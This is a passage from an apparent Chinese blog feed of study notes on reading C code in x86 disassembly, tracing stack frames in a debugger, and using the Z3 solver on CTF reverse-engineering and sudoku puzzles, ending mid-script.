        <content type="html"><![CDATA[<h1 id="VC6基础操作"><a href="#VC6基础操作" class="headerlink" title="VC6基础操作"></a>VC6基础操作</h1><p>F7：编译、F5：调试、F9：设置断点、F10：单步步过、F11：单步进入、shift+F5：结束调试</p><p>调试过程打开寄存器窗口和反汇编窗口</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643095481259.png"></p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643095520646.png"></p><h1 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h1><p>编译器不会管的函数</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643097998389.png"></p><p>__declspec(naked) Func()</p><p>调用空的裸函数会出现错误，因为有call，却没有ret</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643123413854.png"></p><p>进入后直接跳到int3，运行程序会报错</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643123914848.png"></p><p>解决这种只需要加入汇编语句ret，在C语言程序加入汇编语句，需要用到__asm{}。也就是说可以自己在里面写汇编代码来实现需求。</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643126281063.png"></p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643126324265.png"></p><p>执行完这段代码，ret回来了</p><h1 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h1><table><thead><tr><th>__cdecl（c、c++默认）</th><th>从右至左入栈</th><th>调用者清理栈</th></tr></thead><tbody><tr><td>__stdcall</td><td>从右至左入栈</td><td>自身清理堆栈（内平栈）子函数平衡堆栈</td></tr><tr><td>__fastcall</td><td>ECX/EDX传送前两个，剩下的从右至左，寄存器传递速度更快。当只有两个参数传递进去，不需要平衡堆栈</td><td>自身清理堆栈</td></tr></tbody></table><p>所以不能通过ret来分析函数参数的个数</p><p>__cdecl</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643125931583.png"></p><p>外平栈</p><p>内部只有ret</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643126021930.png"></p><p>__stdcall</p><p>右边的参数先入栈</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643126780828.png"></p><p>可以看到这里call之后没有add来回复堆栈平衡，进入调用函数</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643126852766.png"></p><p>可以看到ret变成了ret 8，这就是内平栈</p><p>__fastcall</p><p>两个参数存放在寄存器</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643127369433.png"></p><p>没有修改堆栈，所以不需要add回复堆栈</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643127503312.png"></p><p>有push和mov，外面没有add，进去看</p><p>也是内平栈</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643127554833.png"></p><h1 id="参数个数"><a href="#参数个数" class="headerlink" title="参数个数"></a>参数个数</h1><p>公式一：寄存器+ret 4=参数个数</p><p>公式二：寄存器+[esp+8]+[ebp+0x]=参数个数</p><h1 id="寻找程序入口"><a href="#寻找程序入口" class="headerlink" title="寻找程序入口"></a>寻找程序入口</h1><p>callstack，调用窗口</p><p>main是我们写的程序的入口，但是不是真正程序的入口</p><p>因为在main函数之前需要调用如下函数</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643127627555.png"></p><p>在callstack发现这个函数</p><p>Getversion()</p><p>_headp_int()</p><p>GetCommandLineA()</p><p>_crtGetEnvironmentStringA()</p><p>_setargv()</p><p>_setenvp()</p><p>_cinit()  </p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643127791606.png"></p><p>main函数具有三个参数，所以要寻找具有三个参数的函数，找三个push，并且调用完会add 0xc</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643127884930.png"></p><p>这里很符合</p><p>下断点进入，这里才是main函数</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643127941350.png"></p><h1 id="数据类型与数据存储"><a href="#数据类型与数据存储" class="headerlink" title="数据类型与数据存储"></a>数据类型与数据存储</h1><p>1、存储数据的宽度 </p><p>2、存储数据的格式</p><p>3、作用范围</p><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><h3 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h3><p>char、int、long、short：字节数1、4、4、2，对应上byte、dword、dword、word，long long在VC6对应__int 64</p><p>只会根据数据宽度进行操作，超出数据宽度的不会做修改</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643188104181.png"></p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643128939675.png"></p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643128998071.png"></p><p>g存储的只有0x56</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643129038958.png"></p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643129130357.png"></p><p>数据窗口是小端序</p><h4 id="有符号与无符号"><a href="#有符号与无符号" class="headerlink" title="有符号与无符号"></a>有符号与无符号</h4><p>C语言默认是有符号数</p><p>在内存中存储时无区别，但是在类型转换、比较大小和数学运算时需要注意</p><h3 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h3><p>float、double在存储方式遵从IEEE的规范</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643166176045.png"></p><h1 id="局部变量和全局变量的区分"><a href="#局部变量和全局变量的区分" class="headerlink" title="局部变量和全局变量的区分"></a>局部变量和全局变量的区分</h1><p>局部变量是以ebp-开头的</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643180778946.png"></p><p>全局变量在编译完之后地址就不会改变</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643180903634.png"></p><p>直接放进地址，所以就是全局变量</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643181101615.png"></p><p>在vs2022会因为编译器版本问题，出现不同的汇编指令，但都是大同小异</p><h1 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h1><p>cmp+jcc指令</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643181892321.png"></p><p>cmp相当于减法，前面一个减后面一个，因为x&gt;y时继续执行，所以跳转指令的条件是小于等于</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643182181368.png"></p><p>改成&gt;=之后，汇编指令变成了jl，汇编指令是和C语言反着来的</p><p>&lt;</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643182345813.png"></p><p>==</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643182397987.png"></p><h1 id="多分支语句"><a href="#多分支语句" class="headerlink" title="多分支语句"></a>多分支语句</h1><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643183573683.png"></p><p>x&lt;=y的情况直接跳转到else中</p><p>x&gt;y则往后执行，执行完之后jmp跳转到else语句的后面</p><p>因为mov两边不能都是地址，所以需要用到寄存器</p><h2 id="if、else-if、else"><a href="#if、else-if、else" class="headerlink" title="if、else if、else"></a>if、else if、else</h2><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643184460823.png"></p><h1 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h1><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643187985614.png"></p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643187574671.png"></p><p>内部得到eax的值，eax一般用来存储返回值</p><p>参数传递4个字节</p><p>压栈的时候都是eax</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643188571362.png"></p><h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><h2 id="switch语句反汇编"><a href="#switch语句反汇编" class="headerlink" title="switch语句反汇编"></a>switch语句反汇编</h2><p>当分支较少时采取if……else if ……else的方式</p><h3 id="case连续"><a href="#case连续" class="headerlink" title="case连续"></a>case连续</h3><p>创建大表</p><p> <img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643726580401.png"></p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643726615144.png"></p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643726837151.png"></p><p>sub</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643727141397.png"></p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643727234505.png"></p><p>这里修改参数为103，case条件也修改，发现sub的值发生了变化，所以可以知道sub的值对应最小的case条件的值，这样对应上了大表的位置，所以sub是为了跳转到生成的大表</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643727350589.png"></p><p>正好是case 103的地址</p><h3 id="case连续但中断"><a href="#case连续但中断" class="headerlink" title="case连续但中断"></a>case连续但中断</h3><p>101、102、103的情况使用default的地址填充</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643727925669.png"></p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643728035747.png"></p><p>只要有断开的，就会浪费一片内存地址，所以当间隔太远就不会使用这种方式</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643728378338.png"></p><p>但是当间隔比较大的时候，出现了新情况</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643728454178.png"></p><p>因为已经清空了edx，所以可使用该寄存器，这句话相当于把0x004010dd+eax的值对应地址的内容放入到dl中，dl是八位，对应1个字节，这个就是小表</p><p>当连续但相差较远时会采用小表</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643728595269.png"></p><h3 id="case不连续"><a href="#case不连续" class="headerlink" title="case不连续"></a>case不连续</h3><p>当差值太大，不会生成大表，会直接采取if……else结构</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643727643051.png"></p><p>先判断大于je，再判断等于cmp+jmp</p><h2 id="while循环反汇编"><a href="#while循环反汇编" class="headerlink" title="while循环反汇编"></a>while循环反汇编</h2><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643730937945.png"></p><p>je是当ZF标志位为0是跳转，test是按位与操作，用于判断寄存器的值是否为0</p><h2 id="do……while反汇编"><a href="#do……while反汇编" class="headerlink" title="do……while反汇编"></a>do……while反汇编</h2><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643731312416.png"></p><h2 id="for循环反汇编"><a href="#for循环反汇编" class="headerlink" title="for循环反汇编"></a>for循环反汇编</h2><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643730507558.png"></p><h1 id="数组在内存的存储和寻址"><a href="#数组在内存的存储和寻址" class="headerlink" title="数组在内存的存储和寻址"></a>数组在内存的存储和寻址</h1><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643368384236.png"></p><p>这里数组的存储是从高位往低位存储，也就是从右到左开始存储到缓冲区中，替换缓冲区的数值</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643368588775.png"></p><p>可以看到数组的存储</p><p>再看看数组引用</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643368768572.png"></p><p>[ebp-4]是第一个形参的地址</p><p>[ebp-1ch]对应上数组首元素的地址，eax是存储着第一个形参，****<em>4是因为是int型数组，如果是short，则</em>2</p><p>，数组比较常见的形式就是[ebp+寄存器*数组类型对应的字节大小-数字]</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643369846681.png"></p><p>因为数组下标存在变量，而mov两边不能同时是地址，所以需要先用寄存器存储下标，而直接引用就不需要，即arr[1]</p><h2 id="字符串存储"><a href="#字符串存储" class="headerlink" title="字符串存储"></a>字符串存储</h2><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643371348362.png"></p><p>因为每个寄存器最多存储四个字节，所以需要用到多个寄存器来存储</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643371421546.png"></p><p>在数据窗口中是这样存放的</p><p>寄存器可以重复使用，比如长度不够的情况</p><p><img src="/2022/01/20/C%E8%AF%AD%E8%A8%80%E6%B1%87%E7%BC%96/1643371753305.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编</title>
      <link href="/2022/01/19/%E6%B1%87%E7%BC%96/"/>
      <url>/2022/01/19/%E6%B1%87%E7%BC%96/</url>
      
        <content type="html"><![CDATA[<h1 id="堆栈图"><a href="#堆栈图" class="headerlink" title="堆栈图"></a>堆栈图</h1><p>调用函数实现两数相加</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642592553591.png"></p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642592569833.png"></p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642592579671.png"></p><p>因为pop之后，有一部分的值还是之前保留下来的，所以要进行填充</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642592639529.png"></p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642592648442.png"></p><h1 id="LEA和MOV的区别"><a href="#LEA和MOV的区别" class="headerlink" title="LEA和MOV的区别"></a>LEA和MOV的区别</h1><p>lea是“load effective address”的缩写，简单的说，lea指令可以用来将一个内存地址直接赋给目的操作数，例如：</p><p>lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax，而不是把ebx+8处的内存地址里的数据赋给eax。</p><p>而mov指令则恰恰相反，例如：</p><p>mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p><h1 id="函数在汇编的结构"><a href="#函数在汇编的结构" class="headerlink" title="函数在汇编的结构"></a>函数在汇编的结构</h1><p>函数调用前，堆栈结构如下</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642649724413.png"></p><p>EBP栈底高位，ESP栈顶低位</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642649843226.png"></p><p>下面的三个PUSH是把函数的参数压入栈中，这里是立即数，也可以是寄存器里面的值，注意PUSH指令执行完ESP-4，即栈顶往低位移动</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642650060363.png"></p><p>堆栈图如下</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642650200472.png"></p><p>下一步是CALL指令，F7单步步入，CALL指令会修改EIP的值，将CALL指令下一条指令的地址压入栈顶 ，并且修改EIP的值，相当于一条PUSH和JMP指令，JMP只会修改EIP的值，EIP存放下一条会执行指令的地址</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642650793595.png"></p><p>堆栈图</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642651074289.png"></p><p>这里JMP直接F8跳转过去，进入函数，入口是PUSH EBP</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642651212988.png"></p><p>可以看到ESP没有变化</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642651299175.png"></p><p>在函数调用中，这三步是提升栈顶，开辟空间</p><p>运行完堆栈应该如下</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642651845629.png"></p><p>运行看看</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642651761171.png"></p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642651894330.png"></p><p>接下来这三步是保存现场，因为在函数调用中，这些寄存器可能被用到，所以要先把里面原本的值压入栈中，此时堆栈图为</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642652121644.png"></p><p>EBP是FED0</p><p>运行</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642652204239.png"></p><p>已经被压入栈中 </p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642652304817.png"></p><p>接下来这步是填充缓冲区</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642652335865.png"></p><p>可以看到堆栈图中开辟的空间里面的值并不是为0，这是因为在调用完函数之后，这些空间的值没有被清除，所以需要填充</p><p>堆栈图</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642656762839.png"></p><p>这里有一点需要说明，local.18是什么意思呢</p><p>看下图</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642656813955.png"></p><p>我们去OD修改设置</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642656868498.png"></p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642656879655.png"></p><p>取消掉就可以了，刚才的指令发生了变化</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642656905307.png"></p><p>接下来解释这几句指令</p><p>lea是取地址，意思是将ebp-0x48的地址存入EDI中</p><p>ECX一般用来存放循环次数，这里是0x12，即18次，这个对应开辟空间的大小</p><p>mov eax，0xCCCCCCCC是填充缓冲区</p><p>最后一句rep表示重复次数，次数由ECX决定，stos dword这条指令表示将EAX内的值放入EDI指定的内存单元中，注意执行一次后EDI会移动4，加减由DF标志位决定</p><p>DF决定movs执行完后esi和edi的移动方向，当为0时，加，否则为减。</p><p>运行</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642657323715.png"></p><p>看接下来的几行指令</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642657469555.png"></p><p>1、将0x2赋给ebp地址的前一个内存单元，<strong>这里的0x2就是局部变量</strong></p><p>2、将EBP+0xc的值赋给eax，eax的值压入栈中，下面也是，画堆栈图</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642657989835.png"></p><p>这里压入栈的数值，将作为内部嵌套函数的参数</p><p>执行完之后</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642658026768.png"></p><p>接下来又是调用函数，将CALL指令下一条指令的地址压入栈顶，EIP修改</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642658203867.png"></p><p>F7步入</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642658261575.png"></p><p>F8之后</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642658343466.png"></p><p>红框部分和前面一样，都是调用函数前提升栈顶、开辟空间、保存现场、填充缓冲区，主要看操作部分</p><p>先把堆栈图画好</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642659116555.png"></p><p>接下来看操作</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642659284922.png"></p><p>这些都没有改变堆栈的值，第一条将0xA赋给EBP-0x4的内存单元，对应堆栈写出操作方式 EAX的值为1+2，最后+0xA，所以最后EAX的值为0xD</p><p>运行</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642659505718.png"></p><p>此时函数的操作部分已经结束，接下来就是退出函数了</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642659609650.png"></p><p>对比一下，跟函数开始正好是反过来的</p><p>POP是先出栈再移动 ，这几个POP就相当于恢复现场，要恢复到未调用函数前，这也是为什么要先把这些值压入栈中的原因。</p><p>mov就是降低栈底，恢复到原来的位置</p><p>retn指令相当于POP EIP，先将栈顶的值赋给EIP，然后栈顶指针移动</p><p>堆栈图如下</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642660789466.png"></p><p>执行后</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642660837614.png"></p><p>可以看到执行完之后，缓冲区的内容不会清理，这也是为什么需要填充缓冲区</p><p>回到后我们发现一个问题，就是函数调用前后堆栈不平衡，堆栈平衡是指调用函数前后堆栈应该相等，这里是因为将函数的参数压入了栈，所以需要接下来的ADD平衡堆栈</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642660910037.png"></p><p>执行完之后</p><p><img src="/2022/01/19/%E6%B1%87%E7%BC%96/1642661042648.png"></p><p>和调用前一致，所以没问题了</p><p>剩下的就是重复之前的操作了，先执行函数操作指令，然后POP还原现场，retn后ADD恢复堆栈平衡</p><p>函数的参数存放在ebp+0x8开始因为call指令会将下一条指令地址压入栈中，而局部变量从ebp-0x4开始</p>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Z3</title>
      <link href="/2022/01/17/Z3/"/>
      <url>/2022/01/17/Z3/</url>
      
        <content type="html"><![CDATA[<p>先来看官方文档</p><p><a href="https://ericpony.github.io/z3py-tutorial/guide-examples.htm">https://ericpony.github.io/z3py-tutorial/guide-examples.htm</a></p><p>这个博客也不错</p><p><a href="https://blog.csdn.net/qq_38154820/article/details/108656598">https://blog.csdn.net/qq_38154820/article/details/108656598</a></p><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><p>  基本语句</p><p>Op    Mnmonics    Description<br>            0    true    恒真<br>            1    flase    恒假<br>            2    =    相等<br>            3    distinct    不同<br>            4    ite    if-then-else<br>            5    and    n元 合取（其中条件必须全部满足）<br>            6    or    n元 析取（其中条件满足之一即可）<br>            7    iff    implication<br>            8    xor    异或<br>            9    not    否定<br>            10    implies    Bi-implications</p><p>1、创建容器</p><p>s=Solver()</p><p>2、创建变量，变量有Int(整型)、BitVector(字节)、数组</p><p>3、添加约束条件</p><p>s.add(约束条件)，需要注意Int不能进行移位运算，python除是//</p><p>4、判断是否存在</p><pre class="language-python" data-language="python"><code class="language-python">if s.check() == sat:      m = s.model()      print(m)else:      print("no answer")</code></pre><h1 id="变量为整型"><a href="#变量为整型" class="headerlink" title="变量为整型"></a>变量为整型</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]Universe_final_answer">https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]Universe_final_answer</a></p><h2 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h2><p><img src="/2022/01/17/Z3/1642416626641.png"></p><p>这里就直接放脚本了</p><pre class="language-python" data-language="python"><code class="language-python">from z3 import*s=Solver()v1=Int('v1')v2=Int('v2')v3=Int('v3')v4=Int('v4')v5=Int('v5')v6=Int('v6')v7=Int('v7')v8=Int('v8')v9=Int('v9')v11=Int('v11')s.add(-85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613)s.add(-85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * v3 == 12613)s.add(-103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - (v6 *64) - 120 * v9 == -10283)s.add(71 * v6 + (v7 *128) + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 == 22855)s.add(5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 == -2944)s.add(-54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 == -2222)s.add(-83 * v11 + -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 == -13258)s.add(81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 == -1559)s.add(101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 == 6308)s.add(99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 == -1697)if s.check()==sat:    result=s.model()print(result)</code></pre><h1 id="变量为数组"><a href="#变量为数组" class="headerlink" title="变量为数组"></a>变量为数组</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p><a href="https://buuoj.cn/challenges#[GWCTF%202019]xxor">https://buuoj.cn/challenges#[GWCTF%202019]xxor</a></p><h2 id="关键代码-1"><a href="#关键代码-1" class="headerlink" title="关键代码"></a>关键代码</h2><p><img src="/2022/01/17/Z3/1642417350041.png"></p><pre class="language-python" data-language="python"><code class="language-python">from z3 import*#添加六个Int数据到s变量中s = [Int('s%d' % i) for i in range(6)]a=Solver()#多个约束条件可以使用逗号间隔a.add(s[2]-s[3]==2225223423,s[3]+s[4]==4201428739,s[2]-s[4]==1121399208,s[0]==0xdf48ef7e,s[5]==0x84f30420,s[1]==0x20caacf4)if a.check() == sat:    print(a.model())</code></pre><p>这样得到的结果不会是数组的形式，如下得到的是数组形式</p><p><img src="/2022/01/17/Z3/1642418166049.png"></p><h1 id="数独问题"><a href="#数独问题" class="headerlink" title="数独问题"></a>数独问题</h1><p>数独问题就是9×9的方块填数（只能是1-9），分成3×3的小方块，行列数字不同，每个小方块数字不能重复</p><p>先贴一下</p><pre class="language-python" data-language="python"><code class="language-python">from z3 import *# 9x9整数变量矩阵X = [ [ Int("x_%s_%s" % (i+1, j+1)) for j in range(9) ]      for i in range(9) ]  # 每个单元格包含{1，…，9}中的值cells_c  = [ And(1 &lt;= X[i][j], X[i][j] &lt;= 9)             for i in range(9) for j in range(9) ]  # 每行最多包含一个数字一次rows_c   = [ Distinct(X[i]) for i in range(9) ]  # 每列最多包含一个数字cols_c   = [ Distinct([ X[i][j] for i in range(9) ])             for j in range(9) ]  # 每个3x3正方形最多包含一个数字sq_c     = [ Distinct([ X[3*i0 + i][3*j0 + j]                        for i in range(3) for j in range(3) ])             for i0 in range(3) for j0 in range(3) ]  sudoku_c = cells_c + rows_c + cols_c + sq_c  # 数独实例，我们用'0'表示空单元格instance = ((0,0,0,0,9,4,0,3,0),            (0,0,0,5,1,0,0,0,7),            (0,8,9,0,0,0,0,4,0),            (0,0,0,0,0,0,2,0,8),            (0,6,0,2,0,1,0,5,0),            (1,0,2,0,0,0,0,0,0),            (0,7,0,0,0,0,5,2,0),            (9,0,0,0,6,5,0,0,0),            (0,4,0,9,7,0,0,0,0))  instance_c = [ If(instance[i][j] == 0,                  True,                  X[i][j] == instance[i][j])               for i in range(9) for j in range(9) ]  s = Solver()s.add(sudoku_c + instance_c)if s.check() == sat:    m = s.model()    r = [ [ m.evaluate(X[i][j]) for j in range(9) ]          for i in range(9) ]    print_matrix(r)else:    print("failed to solve")</code></pre><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>这是改了的数独，比较简单，拿来练练手</p><p><a href="https://buuoj.cn/challenges#[GUET-CTF2019]number_game">https://buuoj.cn/challenges#[GUET-CTF2019]number_game</a></p><h2 id="Z3在题目的运用"><a href="#Z3在题目的运用" class="headerlink" title="Z3在题目的运用"></a>Z3在题目的运用</h2><pre class="language-python" data-language="python"><code class="language-python">from z3 import *# 5*5整数变量矩阵X = [[Int("x_%s_%s" % (i + 1, j + 1)) for j in range(5)]     for i in range(5)]# 每个单元格包含{0，…，4}中的值cells_c = [And(0 &lt;= X[i][j], X[i][j] &lt;= 4)           for i in range(5) for j in range(5)]# 每行最多包含一个数字一次rows_c = [Distinct(X[i]) for i in range(5)]# 每列最多包含一个数字cols_c = [Distinct([X[i][j] for i in range(5)])          for j in range(5)]# 每个5x5正方形最多包含一个数字,i0和j0表示分为几组sq_c = [Distinct([X[5 * i0 + i][5 * j0 + j]                  for i in range(5) for j in range(5)])        for i0 in range(0) for j0 in range(0)]sudoku_c = cells_c + rows_c + cols_c + sq_c# 数独实例，我们用'5'表示空单元格instance = ((1,4,5,2,3),(3,0,5,1,5),(0,5,2,3,5),(5,3,5,5,5),(4,2,5,5,1))instance_c = [If(instance[i][j] == 5,                 True,                 X[i][j] == instance[i][j])              for i in range(5) for j in range(5)]s 